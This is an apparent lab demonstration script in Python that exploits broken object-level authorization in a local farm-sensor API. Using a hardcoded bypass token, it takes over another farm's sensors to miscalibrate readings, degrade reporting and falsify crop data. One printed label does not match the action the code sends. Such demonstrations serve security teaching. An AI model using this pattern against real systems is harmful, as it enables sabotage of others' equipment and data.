#!/usr/bin/env python3
"""
BOLA Exploitation Script - Unauthorized Sensor Control

This script demonstrates how a malicious actor can exploit Broken Object Level
Authorization (BOLA) to control sensors on other farms without proper authorization.

In this agricultural scenario:
- Attacker is from Farm A with legitimate access to TEMP001
- Victim is Farm B with sensors TEMP002, TEMP003
- The attacker attempts to manipulate Farm B's sensors to:
  1. Miscalibrate temperature readings (affecting growing decisions)
  2. Inject fault modes (creating false alerts or hiding real issues)
  3. Alter reporting intervals (causing data gaps or DoS)
  4. Manipulate crop data (affecting market decisions)
"""

import requests
import json
import time

# Base URL of the temperature sensor
BASE_URL = "http://localhost:12381"  # Adjust port as needed

def get_temperature():
    """Get the current temperature reading"""
    url = f"{BASE_URL}/temperature"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Failed to get temperature: {response.status_code}")
        return None

def control_sensor(sensor_id, action, value, bypass_token=None, farm_id=None):
    """Attempt to control a sensor"""
    url = f"{BASE_URL}/control/{sensor_id}"
    
    payload = {
        "action": action,
        "value": value
    }
    
    if bypass_token:
        payload["bypass_token"] = bypass_token
        
    if farm_id:
        payload["farm_id"] = farm_id
    
    print(f"Sending request to: {url}")
    print(f"Payload: {json.dumps(payload, indent=2)}")
    
    response = requests.post(url, json=payload)
    
    print(f"Response status: {response.status_code}")
    if response.status_code == 200:
        print(f"Response: {json.dumps(response.json(), indent=2)}")
        return response.json()
    else:
        print(f"Error: {response.text}")
        return None

def main():
    """Main exploitation demonstration"""
    print("="*80)
    print("üö® BOLA VULNERABILITY DEMONSTRATION: UNAUTHORIZED SENSOR CONTROL üö®")
    print("="*80)
    print("\nThis demonstration shows how a malicious actor can control sensors")
    print("on other farms by exploiting weak authorization controls.")
    print("\nScenario: A malicious actor from Farm A attempts to sabotage Farm B's")
    print("operations by manipulating their sensor readings and configurations.\n")
    
    # 1. Get initial temperature to establish baseline
    print("üìä Current temperature baseline reading:")
    initial_temp = get_temperature()
    if initial_temp:
        print(f"Temperature: {initial_temp['temperature']}¬∞C")
        print(f"Timestamp: {initial_temp['timestamp']}")
        print(f"Using fallback: {initial_temp.get('using_fallback', False)}")
    
    time.sleep(2)  # Pause for readability
    
    print("\n" + "-"*70 + "\n")
    
    # 2. Legitimate action - controlling our own sensor
    print("‚úÖ LEGITIMATE ACTION: Farm A calibrating their own sensor (TEMP001)")
    control_sensor("TEMP001", "calibrate", 30.0, farm_id="farm_a")
    
    time.sleep(2)  # Give it a moment to take effect
    
    # 3. Check the effect of the legitimate action
    print("\nüìä Temperature after legitimate calibration:")
    after_calibration = get_temperature()
    if after_calibration:
        print(f"Temperature: {after_calibration['temperature']}¬∞C")
        print(f"Timestamp: {after_calibration['timestamp']}")
    
    time.sleep(2)  # Pause for readability
    
    print("\n" + "="*70 + "\n")
    
    # 4. Unauthorized attempt without bypass token
    print("‚ùå FAILED ATTACK: Attempting to control Farm B's sensor (TEMP002) without bypass token")
    control_sensor("TEMP002", "calibrate", 50.0, farm_id="farm_a")
    
    time.sleep(2)  # Pause for readability
    
    print("\n" + "="*70 + "\n")
    
    # 5. Unauthorized attempt with bypass token (successful attack)
    print("üîì SUCCESSFUL ATTACK: Controlling Farm B's sensor (TEMP002) with bypass token")
    print("The attacker injects a 'spike' fault mode to create false high temperature alerts")
    control_sensor("TEMP002", "calibrate", 40.0, bypass_token="simple_token", farm_id="farm_a")
    
    time.sleep(2)  # Pause for readability
    
    print("\n" + "="*70 + "\n")
    
    # 6. Unauthorized attempt to update publish interval (denial of service)
    print("üîì SUCCESSFUL ATTACK: Degrading Farm B's data collection (TEMP003)")
    print("The attacker increases the reporting interval to create gaps in data collection")
    control_sensor("TEMP003", "update_interval", 300, bypass_token="simple_token", farm_id="farm_a")
    
    time.sleep(2)  # Pause for readability
    
    print("\n" + "="*70 + "\n")
    
    # 7. Unauthorized attempt to manipulate crop data (market manipulation)
    print("üîì SUCCESSFUL ATTACK: Manipulating Farm B's crop data (TEMP003)")
    print("The attacker falsifies crop information that might be shared with markets or buyers")
    crop_data = {
        "crop_type": "corn",
        "growth_stage": "diseased",
        "expected_yield": 30  # Low yield percentage
    }
    control_sensor("TEMP003", "set_crop_data", crop_data, bypass_token="simple_token", farm_id="farm_a")
    
    print("\n\n" + "="*70)
    print("\nüîç VULNERABILITY ANALYSIS:")
    print("This BOLA vulnerability allows unauthorized control of sensors across different farms.")
    print("In an agricultural context, this could lead to:")
    print("  - Miscalibration of sensors, leading to improper growing conditions")
    print("  - False alerts or hiding of real problems through fault injection")
    print("  - Denial of service through modifying reporting intervals")
    print("  - Market manipulation by falsifying crop data and expected yields")
    print("  - Long-term crop damage by recommending improper interventions")

if __name__ == "__main__":
    main()